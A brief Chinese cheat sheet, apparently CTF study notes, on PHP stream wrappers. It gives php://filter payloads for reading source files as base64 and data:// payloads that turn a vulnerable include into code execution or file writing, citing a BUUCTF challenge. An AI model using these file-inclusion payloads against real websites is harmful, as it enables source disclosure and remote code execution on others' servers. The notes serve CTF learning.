# 总览

1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流



## filter:

主要用于任意文件读取,以及绕过死亡exit

php://filter/read=convert.base64-encode/resource=index.php   **//index.php将不被执行而是读出内容**
php://filter/resource=index.php     **//index.php将被当做php文件执行**



## data:

可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。

<font color='orange'>可以用于写入文件,例题:buuctf-nizhuansiwei</font>

?text=data://text/plain,welcome to the zjctf

?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=  **//使用base64编码**







